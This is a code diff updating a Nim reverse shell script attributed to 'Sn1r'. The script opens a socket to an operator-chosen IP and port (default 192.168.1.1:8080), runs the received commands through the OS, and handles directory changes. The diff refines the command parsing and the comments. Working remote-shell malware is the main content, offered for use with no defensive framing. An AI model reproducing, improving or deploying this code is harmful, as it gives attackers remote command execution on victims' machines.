@@ -1,6 +1,5 @@
 #[ 
-   Created by Sn1r
-   https://github.com/Sn1r/
+   Created by Sn1r https://github.com/Sn1r/ & updated
  ]#
 
 import net, os, osproc, strutils
@@ -11,7 +10,7 @@ proc exe(c: string): string =
 var
   v = newSocket()
 
-  # Change this
+  # Update this
   v1 = if paramCount() >= 1: paramStr(1) else: "192.168.1.1"
   v2 = if paramCount() >= 2: paramStr(2) else: "8080"
 
@@ -31,8 +30,8 @@ try:
 
     if c.strip() == s5:
       os.setCurrentDir(s6)
-    elif c.strip().startswith(s5):
-      let d = c.strip().split(' ')[1]
+    elif c.strip().startsWith(s5 & " "):
+      let d = c.strip().split(' ', maxsplit=1)[1]
       try:
         os.setCurrentDir(d)
       except OSError as b:
@@ -45,4 +44,4 @@ try:
 except:
   raise
 finally:
-  v.close
+  v.close()
